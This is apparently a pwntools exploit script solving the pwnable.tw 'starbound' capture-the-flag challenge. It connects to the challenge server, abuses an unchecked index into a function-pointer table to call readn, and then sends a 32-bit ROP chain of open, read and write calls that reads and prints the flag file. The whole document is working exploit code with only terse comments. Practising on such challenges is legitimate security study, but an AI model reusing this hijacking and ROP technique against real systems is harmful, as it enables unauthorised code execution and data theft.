
from pwn import *
#p = process('./starbound')
p = remote('chall.pwnable.tw',10202)
bin = ELF('./starbound')
#context.log_level = 'debug'

def create_name(name):
        p.sendlineafter('> ','6')
        p.sendlineafter('> ','2')
        p.sendafter('Enter your name: ',name)
        p.sendlineafter('> ','1')
def choice(cmd):
        p.sendafter('> ',cmd)   #me(0x8057f80) + lVar2*4 + 0x1d4


#gdb.attach(p,"""break *0x804a65d""")

name_add = 0x80580d0    # address name string
me = 0x8057f80          # me is (me + 0 + 0x1d4)
read = 0x8048a70
readn = 0x80499a6       # use to call readn from std::in standard again
open = 0x8048970
write = 0x8048a30
ROP = 0x80494da #pop ebx ; pop esi ; pop edi ; ret

log.info("offset name_add and me+0x1d4:" + str((name_add-me-0x1d4)/4))


payload = p32(readn) + '/home/starbound/flag' + 'C'
create_name(payload)

#call readn and we can std::in somethings
choice(str((name_add-me-0x1d4)/4))

#via debug, after readn progarm will "ret" in addr 0x10c from payload we std:in
#so if we padding 0x10c offset, it will ret into funtion continue
#use open, read, write to open, read '/home/starbound/flag' write into name
#write name string std:out
payload = 'A'*0x10c+p32(open)+ p32(ROP) + p32(name_add+0x4) + p32(0) + p32(0)
payload += p32(read) + p32(ROP) + p32(0x3) + p32(name_add) + p32(0x100)
payload += p32(write) + p32(ROP) + p32(0x1) + p32(name_add) + p32(0x100)
p.send(payload)

p.interactive()
